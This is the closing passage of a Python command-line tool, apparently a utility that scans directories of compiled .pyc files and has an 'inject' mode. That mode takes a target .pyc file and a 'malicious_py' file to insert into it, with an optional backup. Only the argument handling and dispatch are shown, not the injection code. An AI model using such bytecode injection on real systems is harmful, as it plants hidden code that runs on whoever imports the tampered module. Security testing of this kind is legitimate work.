    inject_parser.add_argument('-b', '--backup', action='store_true',
                              help='Create backup of original .pyc file')
    
    args = parser.parse_args()
    
    if not args.mode:
        parser.print_help()
        return
    
    print_banner()
    
    if args.mode == 'scan':
        scan_mode(args.directory, args.verbose, args.csv, args.debug if hasattr(args, 'debug') else False)
    elif args.mode == 'inject':
        inject_mode(args.target_pyc, args.malicious_py, args.backup)


if __name__ == '__main__':
    main()
